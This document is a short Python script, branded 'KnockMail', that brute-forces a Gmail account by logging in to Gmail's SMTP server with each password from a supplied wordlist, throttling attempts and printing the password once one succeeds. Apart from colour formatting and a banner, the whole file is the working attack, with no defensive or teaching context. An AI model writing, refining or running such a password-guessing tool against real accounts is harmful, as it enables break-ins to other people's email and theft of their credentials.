# Stuff to Import
import smtplib
import time
import os
from termcolor import colored
import sys
from pyfiglet import Figlet

#Color Codes
black = lambda text: '\033[0;30m' + text + '\033[0m'
red = lambda text: '\033[0;31m' + text + '\033[0m'
green = lambda text: '\033[0;32m' + text + '\033[0m'
yellow = lambda text: '\033[0;33m' + text + '\033[0m'
blue = lambda text: '\033[0;34m' + text + '\033[0m'
magenta = lambda text: '\033[0;35m' + text + '\033[0m'
cyan = lambda text: '\033[0;36m' + text + '\033[0m'
white = lambda text: '\033[0;37m' + text + '\033[0m'

#arguments
email = sys.argv[1]
passlist = sys.argv[2]


#bruteforce (main) function
def Gmail():
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()

    start_time = time.time()

    os.system("clear")
    file = open(passlist, 'r')

    os.system("clear")

    logo = Figlet(font='slant')
    print (colored(logo.renderText('KnockMail'), 'red'))
    print

    print (red("   [" + yellow("*" + red("]" + green(" Email in Scope: " + red("(" + yellow(email + red(")"))))))))
    print (colored("   -------", 'red'))
    print (red("   [" + yellow("*" + red("]" + green(" Password List: " + red("(" + yellow(passlist + red(")"))))))))
    print 

    for password in file:
        password = password.strip("\n")
        try:
            time.sleep(4)
            smtpserver.login(email, password)
            print (colored("   *"*55, 'green'))
            print (colored("   [+] password found: " + password, 'green'))
            elapsed_time = time.time() - start_time
            time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
            print (colored("   [+] Finished in: " + str(elapsed_time), 'green'))
            print (colored("   *"*55, 'green'))
            break
        except smtplib.SMTPAuthenticationError:
            print (green("   [" + yellow("!" + green("]" + red(" Trying Password: " + white(password))))))

#calling the main function
Gmail()